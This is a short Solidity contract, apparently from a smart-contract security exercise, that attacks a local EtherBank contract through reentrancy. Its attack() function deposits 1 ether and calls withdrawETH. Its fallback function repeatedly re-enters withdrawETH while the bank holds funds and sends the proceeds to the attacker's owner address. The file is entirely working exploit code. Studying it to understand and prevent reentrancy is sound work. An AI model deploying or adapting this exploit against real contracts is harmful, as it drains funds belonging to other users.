// SPDX-License-Identifier: GPL-3.0-or-later 
pragma solidity ^0.8.13;

import "../reentrancy-1/EtherBank.sol";

contract rAttack1 is EtherBank {

    EtherBank public etherbank;
    uint public amount = 1 ether;
    address owner;

    constructor(address _bank) payable {
        etherbank = EtherBank(_bank);
        owner = msg.sender;
    }

    function _deposit(uint _amount) private  {
        etherbank.depositETH{value: amount}();
        require(etherbank.balances(address(this)) == amount);
    }


    function attack() external {
        _deposit(amount);
        require(etherbank.balances(address(this)) == amount);
        etherbank.withdrawETH(); 
        
    }
    fallback() external payable {
        if (address(etherbank).balance > 0){
            etherbank.withdrawETH();
            payable(owner).transfer(address(this).balance);
        }
    }

    function getBal() external view returns(uint){
        return address(etherbank).balance;
    }
}
